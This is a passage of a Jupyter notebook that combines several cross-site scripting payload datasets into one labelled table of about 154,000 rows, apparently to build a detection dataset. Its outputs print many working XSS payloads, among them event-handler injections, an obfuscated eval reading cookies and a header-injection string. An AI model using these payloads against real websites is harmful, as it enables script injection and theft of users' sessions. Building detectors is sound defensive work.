         "<animate onpointerdown=alert(1) style=display:block>AnonKryptiQuz</animate>",
         "1"
        ],
        [
         "5",
         "<thead draggable=\"true\" ondrag=\"alert(1)\">AnonKryptiQuz</thead>",
         "1"
        ],
        [
         "6",
         "<x OnXxx=1",
         "1"
        ],
        [
         "7",
         "<lol/onauxclick=[0].some(alert)>rightclickhere",
         "1"
        ],
        [
         "8",
         "a=alert,a(1)",
         "1"
        ],
        [
         "9",
         "<style>@keyframes slidein {}</style><u style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></u>",
         "1"
        ],
        [
         "10",
         "<wbr ondblclick=\"alert(1)\">AnonKryptiQuz</wbr>",
         "1"
        ],
        [
         "11",
         "<keygen onbeforecopy=\"alert(1)\" contenteditable>AnonKryptiQuz</keygen>",
         "1"
        ],
        [
         "12",
         "<element onmouseout=\"alert(1)\" style=display:block>AnonKryptiQuz</element>",
         "1"
        ],
        [
         "13",
         "<blink id=x tabindex=1 onbeforeactivate=alert(1)></blink>",
         "1"
        ],
        [
         "14",
         "&lt;A HREF=\\\"//www&#46;google&#46;com/\\\"&gt;XSS&lt;/A&gt;",
         "1"
        ],
        [
         "15",
         "<html onkeypress=\"alert(1)\" contenteditable style=display:block>AnonKryptiQuz</html>",
         "1"
        ],
        [
         "16",
         "<span onmousemove=\"alert(1)\">AnonKryptiQuz</span>",
         "1"
        ],
        [
         "17",
         "%00%00%00%00%00%00%00<script>alert(1)</script>",
         "1"
        ],
        [
         "18",
         "<span onmouseenter=\"alert(1)\" style=display:block>AnonKryptiQuz</span>",
         "1"
        ],
        [
         "19",
         "{{window['eval'](window['atob'](window['decodeURIComponent']('Ij48aW1nIHNyYz14IG9uZXJyb3I9cHJvbXB0KGRvY3VtZW50LmNvb2tpZSk7PjEy')))}}",
         "1"
        ],
        [
         "20",
         "<th onclick=\"alert(1)\" style=display:block>AnonKryptiQuz</th>",
         "1"
        ],
        [
         "21",
         "#\\'-alert(1)//",
         "1"
        ],
        [
         "22",
         "<u oncut=alert(1) value=\"AnonKryptiQuz\" autofocus tabindex=1 style=display:block>AnonKryptiQuz",
         "1"
        ],
        [
         "23",
         "<object data=\"data:text/html;base64,%(base64)s\">",
         "1"
        ],
        [
         "24",
         "<dt onkeydown=\"alert(1)\" contenteditable>AnonKryptiQuz</dt>",
         "1"
        ],
        [
         "25",
         "<acronym draggable=\"true\" ondragenter=\"alert(1)\">AnonKryptiQuz</acronym>",
         "1"
        ],
        [
         "26",
         "<input onmouseup=\"alert(1)\" style=display:block>AnonKryptiQuz</input>",
         "1"
        ],
        [
         "27",
         "--><!--*{color:red}   /* all UA */",
         "1"
        ],
        [
         "28",
         "<meter draggable=\"true\" ondragenter=\"alert(1)\" style=display:block>AnonKryptiQuz</meter>",
         "1"
        ],
        [
         "29",
         "<noframes oncontextmenu=\"alert(1)\">AnonKryptiQuz</noframes>",
         "1"
        ],
        [
         "30",
         "<style>:target {color:red;}</style><map id=x style=\"transition:color 1s\" ontransitionend=alert(1)></map>",
         "1"
        ],
        [
         "31",
         "<label>type a,b,c,d - watch the network tab/traffic (JS is off, laAnonKryptiQuz NoScript)</label>",
         "1"
        ],
        [
         "32",
         "<header draggable=\"true\" ondragenter=\"alert(1)\" style=display:block>AnonKryptiQuz</header>",
         "1"
        ],
        [
         "33",
         "<br onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</br><input value=clickme>",
         "1"
        ],
        [
         "34",
         "$(\"script(2)\")",
         "1"
        ],
        [
         "35",
         "<style>:target {transform: rotate(180deg);}</style><header id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></header>",
         "1"
        ],
        [
         "36",
         "<embed onbeforepaste=\"alert(1)\" contenteditable>AnonKryptiQuz</embed>",
         "1"
        ],
        [
         "37",
         "<source onmousewheel=alert(1) style=display:block>requires scrolling",
         "1"
        ],
        [
         "38",
         "<svg><td onload=alert(1)></td>",
         "1"
        ],
        [
         "39",
         "%3Cform%20action%3D%60javascript%3Aalert%28%60AnonKryptiQuz%60%29%60%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E",
         "1"
        ],
        [
         "40",
         "<summary onkeyup=\"alert(1)\" contenteditable style=display:block>AnonKryptiQuz</summary>",
         "1"
        ],
        [
         "41",
         "%E5%98%8D%E5%98%8ASet-Cookie:whoami=thecyberneh%0d%0a%0a%3Cscript%3Ealert(1);%3C/script%3E",
         "1"
        ],
        [
         "42",
         "&lt;HTML&gt;&lt;BODY&gt;",
         "1"
        ],
        [
         "43",
         "<template oncontextmenu=\"alert(1)\" style=display:block>AnonKryptiQuz</template>",
         "1"
        ],
        [
         "44",
         "<del draggable=\"true\" ondragstart=\"alert(1)\">AnonKryptiQuz</del>",
         "1"
        ],
        [
         "45",
         "<input type=radio id=x onfocus=alert(1)>",
         "1"
        ],
        [
         "46",
         "<keygen id=x tabindex=1 onactivate=alert(1)></keygen>",
         "1"
        ],
        [
         "47",
         "<video onmousedown=\"alert(1)\" style=display:block>AnonKryptiQuz</video>",
         "1"
        ],
        [
         "48",
         "<dir onbeforecut=\"alert(1)\" contenteditable>AnonKryptiQuz</dir>",
         "1"
        ],
        [
         "49",
         "<tbody onpointermove=alert(1) style=display:block>AnonKryptiQuz</tbody>",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 18046
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>&lt;script id=x tabindex=1 onbeforeactivate=alert...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;legend id=...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>&lt;summary onpointerout=alert(1) style=display:b...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>&amp;lt;BODY BACKGROUND=&amp;quot;javascript:alert(&amp;ap...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>&lt;animate onpointerdown=alert(1) style=display:...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18041</th>\n",
       "      <td>&lt;style&gt;:target {color:red;}&lt;/style&gt;&lt;mark id=x ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18042</th>\n",
       "      <td>&lt;style&gt;:target {color: red;}&lt;/style&gt;&lt;xmp id=x ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18043</th>\n",
       "      <td>&lt;details onpaste=\"alert(1)\" contenteditable&gt;An...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18044</th>\n",
       "      <td>&lt;data onmouseover=\"alert(1)\" style=display:blo...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>18045</th>\n",
       "      <td>&lt;tbody onbeforecopy=\"alert(1)\" contenteditable...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>18046 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                 payload  xss\n",
       "0      <script id=x tabindex=1 onbeforeactivate=alert...    1\n",
       "1      <style>:target {color:red;}</style><legend id=...    1\n",
       "2      <summary onpointerout=alert(1) style=display:b...    1\n",
       "3      &lt;BODY BACKGROUND=&quot;javascript:alert(&ap...    1\n",
       "4      <animate onpointerdown=alert(1) style=display:...    1\n",
       "...                                                  ...  ...\n",
       "18041  <style>:target {color:red;}</style><mark id=x ...    1\n",
       "18042  <style>:target {color: red;}</style><xmp id=x ...    1\n",
       "18043  <details onpaste=\"alert(1)\" contenteditable>An...    1\n",
       "18044  <data onmouseover=\"alert(1)\" style=display:blo...    1\n",
       "18045  <tbody onbeforecopy=\"alert(1)\" contenteditable...    1\n",
       "\n",
       "[18046 rows x 2 columns]"
      ]
     },
     "execution_count": 805,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "anon_payloads = pd.concat([atep, atrp], ignore_index=True)\n",
    "anon_payloads[\"xss\"] = 1\n",
    "anon_payloads"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 806,
   "metadata": {},
   "outputs": [],
   "source": [
    "anon_payloads.to_csv(\"../Datasets/Processed/xss_anon_payloads.csv\", index=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Combining datasets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 807,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_payloads = pd.concat([payloads, anon_payloads, xss_data, xss_od, xss_dsm, xss_scxm, xss_pf, xss_code_vul, xss_sxm], ignore_index=True)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 808,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 153872 entries, 0 to 153871\n",
      "Data columns (total 2 columns):\n",
      " #   Column   Non-Null Count   Dtype \n",
      "---  ------   --------------   ----- \n",
      " 0   payload  153872 non-null  object\n",
      " 1   xss      153872 non-null  int64 \n",
      "dtypes: int64(1), object(1)\n",
      "memory usage: 2.3+ MB\n"
     ]
    }
   ],
   "source": [
    "all_payloads.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 817,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "153872\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3089113206.py:1: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3089113206.py:1: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3089113206.py:1: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3089113206.py:1: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3089113206.py:1: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3089113206.py:1: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3089113206.py:1: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3089113206.py:1: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])\n",
      "/var/folders/3h/x3xvrvmn1k739nf02crffq1h0000gn/T/ipykernel_15855/3089113206.py:1: FutureWarning: Series.__getitem__ treating keys as positions is deprecated. In a future version, integer keys will always be treated as labels (consistent with DataFrame behavior). To access a value by position, use `ser.iloc[pos]`\n",
      "  print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])\n"
     ]
    }
   ],
   "source": [
    "print(payloads.count()[0]+anon_payloads.count()[0]+xss_data.count()[0]+xss_od.count()[0]+xss_dsm.count()[0]+xss_scxm.count()[0]+xss_pf.count()[0]+xss_code_vul.count()[0]+xss_sxm.count()[0])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 818,
   "metadata": {},
   "outputs": [],
   "source": [
    "all_payloads.to_csv(\"../Datasets/Processed/process_all_xss_payloads.csv\", index=False)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 820,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "xss\n",
       "1    147559\n",
       "0      6313\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 820,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_payloads[\"xss\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 827,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "payload",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "xss",
         "rawType": "int64",
         "type": "integer"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "55f68312-8157-49c1-bff3-ce24d69c0141",
       "rows": [
        [
         "0",
         "\"-prompt(8)-\"",
         "1"
        ],
        [
         "1",
         "'-prompt(8)-'",
         "1"
        ],
        [
         "2",
         "\";a=prompt,a()//",
         "1"
        ],
        [
         "3",
         "';a=prompt,a()//",
         "1"
        ],
        [
         "4",
         "'-eval(\"window['pro'%2B'mpt'](8)\")-'",
         "1"
        ],
        [
         "5",
         "\"-eval(\"window['pro'%2B'mpt'](8)\")-\"",
         "1"
        ],
        [
         "6",
         "\"onclick=prompt(8)>\"@x.y",
         "1"
        ],
        [
         "7",
         "\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
         "1"
        ],
        [
         "8",
         "<image/src/onerror=prompt(8)>",
         "1"
        ],
        [
         "9",
         "<img/src/onerror=prompt(8)>",
         "1"
        ],
        [
         "10",
         "<image src/onerror=prompt(8)>",
         "1"
        ],
        [
         "11",
         "<img src/onerror=prompt(8)>",
         "1"
        ],
        [
         "12",
         "<image src =q onerror=prompt(8)>",
         "1"
        ],
        [
         "13",
         "<img src =q onerror=prompt(8)>",
         "1"
        ],
        [
         "14",
         "</scrip</script>t><img src =q onerror=prompt(8)>",
         "1"
        ],
        [
         "15",
         "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "16",
         "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "17",
         "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "18",
         "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "19",
         "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "20",
         "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "21",
         "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
         "1"
        ],
        [
         "22",
         "'`\"><\\x3Cscript>javascript:alert(1)</script>",
         "1"
        ],
        [
         "23",
         "'`\"><\\x00script>javascript:alert(1)</script>",
         "1"
        ],
        [
         "24",
         "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
         "1"
        ],
        [
         "25",
         "<audio src=1 href=1 onerror=\"javascript:alert(1)\"></audio>",
         "1"
        ],
        [
         "26",
         "<video src=1 href=1 onerror=\"javascript:alert(1)\"></video>",
         "1"
        ],
        [
         "27",
         "<body src=1 href=1 onerror=\"javascript:alert(1)\"></body>",
         "1"
        ],
        [
         "28",
         "<image src=1 href=1 onerror=\"javascript:alert(1)\"></image>",
         "1"
        ],
        [
         "29",
         "<object src=1 href=1 onerror=\"javascript:alert(1)\"></object>",
         "1"
        ],
        [
         "30",
         "<script src=1 href=1 onerror=\"javascript:alert(1)\"></script>",
         "1"
        ],
        [
         "31",
         "<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>",
         "1"
        ],
        [
         "32",
         "<title onPropertyChange title onPropertyChange=\"javascript:javascript:alert(1)\"></title onPropertyChange>",
         "1"
        ],
        [
         "33",
         "<iframe onLoad iframe onLoad=\"javascript:javascript:alert(1)\"></iframe onLoad>",
         "1"
        ],
        [
         "34",
         "<body onMouseEnter body onMouseEnter=\"javascript:javascript:alert(1)\"></body onMouseEnter>",
         "1"
        ],
        [
         "35",
         "<body onFocus body onFocus=\"javascript:javascript:alert(1)\"></body onFocus>",
         "1"
        ],
        [
         "36",
         "<frameset onScroll frameset onScroll=\"javascript:javascript:alert(1)\"></frameset onScroll>",
         "1"
        ],
        [
         "37",
         "<script onReadyStateChange script onReadyStateChange=\"javascript:javascript:alert(1)\"></script onReadyStateChange>",
         "1"
        ],
        [
         "38",
         "<html onMouseUp html onMouseUp=\"javascript:javascript:alert(1)\"></html onMouseUp>",
         "1"
        ],
        [
         "39",
         "<body onPropertyChange body onPropertyChange=\"javascript:javascript:alert(1)\"></body onPropertyChange>",
         "1"
        ],
        [
         "40",
         "<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>",
         "1"
        ],
        [
         "41",
         "<body onPageHide body onPageHide=\"javascript:javascript:alert(1)\"></body onPageHide>",
         "1"
        ],
        [
         "42",
         "<body onMouseOver body onMouseOver=\"javascript:javascript:alert(1)\"></body onMouseOver>",
         "1"
        ],
        [
         "43",
         "<body onUnload body onUnload=\"javascript:javascript:alert(1)\"></body onUnload>",
         "1"
        ],
        [
         "44",
         "<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>",
         "1"
        ],
        [
         "45",
         "<bgsound onPropertyChange bgsound onPropertyChange=\"javascript:javascript:alert(1)\"></bgsound onPropertyChange>",
         "1"
        ],
        [
         "46",
         "<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>",
         "1"
        ],
        [
         "47",
         "<html onMouseWheel html onMouseWheel=\"javascript:javascript:alert(1)\"></html onMouseWheel>",
         "1"
        ],
        [
         "48",
         "<style onLoad style onLoad=\"javascript:javascript:alert(1)\"></style onLoad>",
         "1"
        ],
        [
         "49",
         "<iframe onReadyStateChange iframe onReadyStateChange=\"javascript:javascript:alert(1)\"></iframe onReadyStateChange>",
         "1"
        ]
       ],
       "shape": {
        "columns": 2,
        "rows": 147559
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>payload</th>\n",
       "      <th>xss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>\"-prompt(8)-\"</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>'-prompt(8)-'</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>\";a=prompt,a()//</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>';a=prompt,a()//</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>'-eval(\"window['pro'%2B'mpt'](8)\")-'</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>153867</th>\n",
       "      <td>produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>153868</th>\n",
       "      <td>m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>153869</th>\n",
       "      <td>q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>153870</th>\n",
       "      <td>Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>153871</th>\n",
       "      <td>method=show&amp;lojaPrincipal=&amp;areaName=busca&amp;nome...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>147559 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                  payload  xss\n",
       "0                                           \"-prompt(8)-\"    1\n",
       "1                                           '-prompt(8)-'    1\n",
       "2                                        \";a=prompt,a()//    1\n",
       "3                                        ';a=prompt,a()//    1\n",
       "4                    '-eval(\"window['pro'%2B'mpt'](8)\")-'    1\n",
       "...                                                   ...  ...\n",
       "153867  produto=%22%3E'%3E%3CSCRIPT%3Ealert(String.fro...    1\n",
       "153868  m=%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharC...    1\n",
       "153869      q=%3Cscript%3Ealert%28%22m%22%29%3C/script%3E    1\n",
       "153870  Search=%22%3E'%3E%3CSCRIPT%20SRC=http://br.zon...    1\n",
       "153871  method=show&lojaPrincipal=&areaName=busca&nome...    1\n",
       "\n",
       "[147559 rows x 2 columns]"
      ]
     },
     "execution_count": 827,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_payloads[all_payloads[\"xss\"] == 1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 829,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11}"
      ]
     },
     "execution_count": 829,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "l = [1,2 ,3, 4, 5, 6, 7, 8, 9, 10]\n",
    "l = set(l)\n",
    "l.add(11)\n",
    "l"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
